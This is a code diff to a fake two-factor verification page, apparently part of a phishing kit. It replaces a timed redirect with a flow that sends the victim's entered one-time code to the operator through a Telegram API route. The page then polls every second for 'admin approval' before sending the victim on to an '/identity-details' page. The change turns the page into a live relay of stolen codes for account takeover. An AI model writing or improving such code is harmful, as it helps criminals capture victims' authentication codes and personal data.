@@ -1,5 +1,5 @@
 "use client";
-import { useState } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { Header } from "@/sections/Header";
 import { notifyTelegram } from "@/lib/telegram-notify";
@@ -10,15 +10,85 @@ export default function TwoFactorVerifyPage() {
   const [rememberBrowser, setRememberBrowser] = useState(false);
   const [loginLoading, setLoginLoading] = useState(false);
   const [codeError, setCodeError] = useState(false);
+  const [statusMessage, setStatusMessage] = useState<string | null>(null);
+  const [statusType, setStatusType] = useState<"pending" | "approved" | "declined" | null>(null);
+  const [pendingCodeId, setPendingCodeId] = useState<string | null>(null);
+  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   const clearCodeErr = () => {
     setCodeError(false);
   };
 
-  
+  // Poll for code approval status
+  useEffect(() => {
+    if (!pendingCodeId || !loginLoading) return;
+
+    const pollCodeStatus = async () => {
+      try {
+        const response = await fetch(
+          `/api/telegram/code-status?codeId=${encodeURIComponent(pendingCodeId)}`,
+        );
+        const data = (await response.json()) as {
+          ok: boolean;
+          status: string;
+          expiresAt: number;
+        };
+
+        if (!data.ok) {
+          return;
+        }
+
+        if (data.status === "approved") {
+          clearPolling();
+          setStatusType("approved");
+          setStatusMessage("✅ Code approved! Proceeding...");
+          setLoginLoading(false);
+
+          setTimeout(() => {
+            router.push("/identity-details");
+          }, 800);
+        } else if (data.status === "declined") {
+          clearPolling();
+          setStatusType("declined");
+          setStatusMessage("❌ Code was declined. Please try a new code.");
+          setLoginLoading(false);
+          setCode("");
+          setPendingCodeId(null);
+        } else if (data.status === "expired") {
+          clearPolling();
+          setStatusType("declined");
+          setStatusMessage("⏱️ Code expired. Please request a new one.");
+          setLoginLoading(false);
+          setCode("");
+          setPendingCodeId(null);
+        }
+      } catch (err) {
+        console.error("Failed to check code status:", err);
+      }
+    };
+
+    const interval = setInterval(pollCodeStatus, 1000); // Poll every second
+    pollingIntervalRef.current = interval;
+
+    return () => {
+      clearInterval(interval);
+    };
+  }, [pendingCodeId, loginLoading, router]);
+
+  const clearPolling = () => {
+    if (pollingIntervalRef.current) {
+      clearInterval(pollingIntervalRef.current);
+      pollingIntervalRef.current = null;
+    }
+  };
 
   const handleResend = () => {
-    
+    clearPolling();
+    setCode("");
+    setStatusMessage(null);
+    setStatusType(null);
+    setPendingCodeId(null);
+    setLoginLoading(false);
   };
 
   const handleLogin = async () => {
@@ -28,21 +98,41 @@ export default function TwoFactorVerifyPage() {
     }
 
     setLoginLoading(true);
+    setStatusMessage("⏳ Waiting for admin approval...");
+    setStatusType("pending");
 
-    // Send verification to Telegram
-    notifyTelegram({
-      kind: "verification",
-      method: "text",
-      code: code,
-      otpStep: 1,
-    });
+    try {
+      // Send verification to Telegram
+      const response = await fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          kind: "verification",
+          method: "text",
+          code: code,
+          otpStep: 1,
+        }),
+      });
 
-    setTimeout(() => {
+      const result = (await response.json()) as {
+        ok: boolean;
+        error?: string;
+        codeId?: string;
+      };
+
+      if (result.ok && result.codeId) {
+        setPendingCodeId(result.codeId);
+      } else {
+        setStatusMessage("❌ Failed to send code for verification");
+        setStatusType("declined");
+        setLoginLoading(false);
+      }
+    } catch (err) {
+      console.error("Failed to send verification:", err);
+      setStatusMessage("❌ Error submitting code");
+      setStatusType("declined");
       setLoginLoading(false);
-
-      // Navigate to next page or dashboard
-      router.push("/identity-details");
-    }, 1800);
+    }
   };
 
   return (
@@ -492,7 +582,7 @@ export default function TwoFactorVerifyPage() {
 
             {/* Action buttons */}
             <div className="action-row">
-              <button className="btn-resend" onClick={handleResend}>
+              <button className="btn-resend" onClick={handleResend} disabled={loginLoading}>
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
                   <path d="M12 6v3l4-4-4-4v3c-4.42 0-8 3.58-8 8 0 1.57.46 3.03 1.24 4.26L6.7 14.8A5.87 5.87 0 016 12c0-3.31 2.69-6 6-6zm6.76 1.74L17.3 9.2c.44 1.03.7 2.15.7 2.8 0 3.31-2.69 6-6 6v-3l-4 4 4 4v-3c4.42 0 8-3.58 8-8 0-1.57-.46-3.03-1.24-4.26z" />
                 </svg>
@@ -520,6 +610,39 @@ export default function TwoFactorVerifyPage() {
                 </svg>
               </button>
             </div>
+
+            {/* Status message */}
+            {statusMessage && (
+              <div
+                style={{
+                  padding: "12px 14px",
+                  borderRadius: "4px",
+                  fontSize: "0.875rem",
+                  marginBottom: "14px",
+                  backgroundColor:
+                    statusType === "pending"
+                      ? "#fff3cd"
+                      : statusType === "approved"
+                        ? "#d4edda"
+                        : "#f8d7da",
+                  color:
+                    statusType === "pending"
+                      ? "#856404"
+                      : statusType === "approved"
+                        ? "#155724"
+                        : "#721c24",
+                  border: `1px solid ${
+                    statusType === "pending"
+                      ? "#ffeaa7"
+                      : statusType === "approved"
+                        ? "#c3e6cb"
+                        : "#f5c6cb"
+                  }`,
+                }}
+              >
+                {statusMessage}
+              </div>
+            )}
 
             {/* Info alert box */}
             <div className="info-alert">
